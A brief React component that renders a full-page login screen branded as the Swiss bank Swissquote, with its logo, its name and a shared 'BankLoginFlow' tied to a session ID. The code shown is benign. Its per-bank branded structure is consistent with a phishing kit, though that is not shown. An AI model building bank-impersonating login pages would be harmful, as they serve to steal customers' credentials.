import { BankLoginFlow } from '@/features/bank-login/BankLoginFlow';
import { swissquote } from '@/config/banks/swissquote';

type Props = { sessionId: string };

export default function Swissquote({ sessionId }: Props) {
    return (
        <div className="flex min-h-screen flex-col bg-white">
            <header className="border-b border-gray-200 px-6 py-4">
                <img
                    src={swissquote.brand.logoPath}
                    alt={swissquote.displayName}
                    className="h-8"
                />
            </header>
            <main className="mx-auto mt-12 w-full max-w-md px-4">
                <h1 className="mb-6 text-xl font-semibold text-black">
                    {swissquote.displayName}
                </h1>
                <BankLoginFlow bank={swissquote} sessionId={sessionId} />
            </main>
        </div>
    );
}
